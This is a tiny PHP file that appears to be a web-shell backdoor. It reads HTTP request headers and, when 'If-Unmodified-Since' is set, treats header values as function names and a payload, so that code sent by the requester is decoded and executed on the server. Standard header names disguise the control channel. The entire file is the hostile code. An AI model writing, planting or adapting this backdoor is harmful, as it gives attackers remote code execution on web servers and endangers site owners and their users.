<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $rjust = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Feature-Policy']));
    $rjust();
}